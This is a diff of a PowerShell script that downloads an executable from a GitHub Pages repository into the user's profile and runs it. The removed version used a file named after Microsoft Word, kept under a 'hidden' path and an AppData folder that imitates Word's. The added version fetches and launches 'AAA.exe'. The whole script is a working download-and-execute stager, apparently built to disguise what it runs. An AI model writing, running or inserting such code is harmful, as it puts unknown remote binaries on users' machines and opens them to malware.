@@ -1,9 +1,8 @@
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
-$localPath = "$folderPath\MicrosoftWord.exe"
+$destinationPath = "$env:USERPROFILE\AAA.exe"
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/AAA/AAA.exe"
 
-if (-Not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath
+if (-Not (Test-Path $destinationPath)) {
+    Invoke-WebRequest -Uri $url -OutFile $destinationPath
 }
 
-Start-Process $localPath
+Start-Process $destinationPath
